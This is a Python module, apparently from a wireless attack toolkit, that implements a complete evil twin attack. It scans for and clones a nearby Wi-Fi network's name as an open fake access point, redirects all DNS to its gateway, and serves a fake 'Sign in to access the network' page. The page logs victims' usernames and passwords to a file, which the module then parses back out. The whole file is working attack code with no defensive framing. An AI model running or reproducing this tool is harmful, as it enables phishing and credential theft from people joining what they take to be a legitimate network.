"""Evil Twin — fake WiFi AP + captive portal credential capture.

Uses hostapd for the fake AP and dnsmasq for DHCP/DNS.
Captures credentials via a lightweight HTTP captive portal.
Requires: hostapd, dnsmasq, airodump-ng (for target scanning).
"""

import os
import re
import time
import signal
import subprocess
import threading
from pathlib import Path

from core.run import run as _run


STORAGE_DIR = Path(__file__).resolve().parent.parent / "storage"
EVIL_TWIN_DIR = STORAGE_DIR / "evil_twin"
EVIL_TWIN_DIR.mkdir(parents=True, exist_ok=True)

HOSTAPD_CONF = EVIL_TWIN_DIR / "hostapd.conf"
DNSMASQ_CONF = EVIL_TWIN_DIR / "dnsmasq.conf"
CRED_LOG = EVIL_TWIN_DIR / "credentials.log"
CAPTIVE_PORTAL = EVIL_TWIN_DIR / "captive.html"

AP_INTERFACE = None
_process_refs = []


def _get_ap_interface(iface: str) -> str:
    """Create a virtual AP interface using airbase-ng or hostapd."""
    global AP_INTERFACE
    AP_INTERFACE = f"{iface}ap"
    return AP_INTERFACE


def scan_targets(iface: str, timeout: int = 8) -> list[dict]:
    """Scan for nearby APs to clone."""
    from core.scanner import parse_airodump_csv
    prefix = "/tmp/eviltwin_scan"
    _run(["timeout", str(timeout), "airodump-ng", iface, "--band", "bg",
          "--write", prefix, "--output-format", "csv", "--background", "1"],
         timeout=timeout + 5)
    return parse_airodump_csv(f"{prefix}-01.csv")


def setup_hostapd(iface: str, essid: str, channel: str = "6",
                  hidden: bool = False) -> str:
    """Write hostapd config for fake AP."""
    hidden_str = "ignore_broadcast_ssid=1" if hidden else "ignore_broadcast_ssid=0"
    config = f"""interface={iface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
{hidden_str}
wmm_enabled=0
auth_algs=1
wpa=0
"""
    HOSTAPD_CONF.write_text(config)
    return str(HOSTAPD_CONF)


def setup_dnsmasq(iface: str, gateway: str = "10.0.0.1") -> str:
    """Write dnsmasq config for DHCP + DNS redirect to captive portal."""
    config = f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.200,12h
dhcp-option=3,{gateway}
dhcp-option=6,{gateway}
server=8.8.8.8
log-queries
log-dhcp
address=/#/{gateway}
"""
    DNSMASQ_CONF.write_text(config)
    return str(DNSMASQ_CONF)


def setup_captive_portal(title: str = "WiFi Login") -> str:
    """Write a minimal captive portal HTML page."""
    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title}</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: -apple-system, sans-serif; background: #0f172a; color: #e2e8f0;
       display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
.card {{ background: #1e293b; border: 1px solid #334155; border-radius: 12px;
         padding: 2.5rem; width: 380px; text-align: center; }}
h1 {{ font-size: 1.5rem; margin-bottom: 0.3rem; color: #3b82f6; }}
p {{ color: #94a3b8; font-size: 0.85rem; margin-bottom: 1.5rem; }}
input {{ width: 100%; padding: 0.7rem 1rem; margin-bottom: 1rem; border: 1px solid #334155;
         border-radius: 6px; background: #0f172a; color: #e2e8f0; font-size: 0.9rem; }}
input:focus {{ outline: none; border-color: #3b82f6; }}
button {{ width: 100%; padding: 0.7rem; background: #3b82f6; color: white; border: none;
          border-radius: 6px; font-size: 0.9rem; font-weight: 600; cursor: pointer; }}
button:hover {{ background: #2563eb; }}
.error {{ color: #ef4444; font-size: 0.8rem; margin-top: 0.5rem; display: none; }}
</style>
</head>
<body>
<div class="card">
  <h1>{title}</h1>
  <p>Sign in to access the network</p>
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username or Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Connect</button>
  </form>
</div>
</body>
</html>"""
    CAPTIVE_PORTAL.write_text(html)
    return str(CAPTIVE_PORTAL)


def _start_captive_server(iface: str, gateway: str = "10.0.0.1", port: int = 80):
    """Start a minimal Python HTTP server that captures credentials."""
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import urllib.parse

    class CaptiveHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(CAPTIVE_PORTAL.read_bytes())

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode()
            params = urllib.parse.parse_qs(body)
            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            entry = f"[{timestamp}] username={username} password={password}\n"
            with open(CRED_LOG, "a") as f:
                f.write(entry)
            # Show thank you page
            thanks = f"""<html><body style="font-family:sans-serif;background:#0f172a;color:#e2e8f0;
            display:flex;justify-content:center;align-items:center;min-height:100vh;">
            <div style="text-align:center"><h1 style="color:#22c55e">Connected!</h1>
            <p>You may now close this window.</p></div></body></html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(thanks.encode())

        def log_message(self, format, *args):
            pass  # suppress logs

    server = HTTPServer((gateway, port), CaptiveHandler)
    server.serve_forever()


def start_evil_twin(iface: str, essid: str, channel: str = "6",
                     gateway: str = "10.0.0.1", callback=None) -> dict:
    """Start the full evil twin: hostapd + dnsmasq + captive portal."""
    result = {"success": False, "error": None, "processes": []}

    def log(msg):
        if callback:
            callback(msg)

    log(f"[bold cyan]Starting Evil Twin: {essid} on ch{channel}[/]")

    # Setup configs
    ap_iface = _get_ap_interface(iface)
    setup_hostapd(ap_iface, essid, channel)
    setup_dnsmasq(ap_iface, gateway)
    setup_captive_portal(essid)

    log(f"  AP interface: {ap_iface}")
    log(f"  Gateway: {gateway}")
    log(f"  Captive portal: {str(CAPTIVE_PORTAL)}")

    # Start hostapd
    try:
        proc = subprocess.Popen(
            ["hostapd", str(HOSTAPD_CONF)],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )
        result["processes"].append(proc)
        time.sleep(2)
        if proc.poll() is not None:
            output = proc.stdout.read()
            result["error"] = f"hostapd failed: {output[:200]}"
            log(f"[red]{result['error']}[/]")
            return result
        log("[green]  hostapd running[/]")
    except FileNotFoundError:
        result["error"] = "hostapd not found — install: sudo apt install hostapd"
        log(f"[red]{result['error']}[/]")
        return result

    # Start dnsmasq
    try:
        proc = subprocess.Popen(
            ["dnsmasq", "-C", str(DNSMASQ_CONF), "--no-daemon"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )
        result["processes"].append(proc)
        time.sleep(1)
        log("[green]  dnsmasq running[/]")
    except FileNotFoundError:
        result["error"] = "dnsmasq not found — install: sudo apt install dnsmasq"
        log(f"[red]{result['error']}[/]")
        return result

    # Start captive portal server in background
    server_thread = threading.Thread(
        target=_start_captive_server, args=(ap_iface, gateway), daemon=True,
    )
    server_thread.start()
    log("[green]  Captive portal running[/]")
    log(f"[bold green]Evil Twin active: {essid}[/]")
    log(f"[dim]Credentials saved to: {CRED_LOG}[/]")
    result["success"] = True
    return result


def stop_evil_twin(processes: list = None):
    """Stop all evil twin processes."""
    if processes:
        for p in processes:
            try:
                p.terminate()
                p.wait(timeout=5)
            except Exception:
                p.kill()
    # Also kill any lingering hostapd/dnsmasq
    _run(["pkill", "-f", "hostapd"])
    _run(["pkill", "-f", "dnsmasq"])
    _run(["pkill", "-f", "captive"])


def get_captured_credentials() -> list[dict]:
    """Parse the credential log file."""
    creds = []
    if not CRED_LOG.exists():
        return creds
    for line in CRED_LOG.read_text().splitlines():
        m = re.search(r"\[(.+?)\] username=(.+?) password=(.*)", line)
        if m:
            creds.append({
                "timestamp": m.group(1),
                "username": m.group(2),
                "password": m.group(3),
            })
    return creds
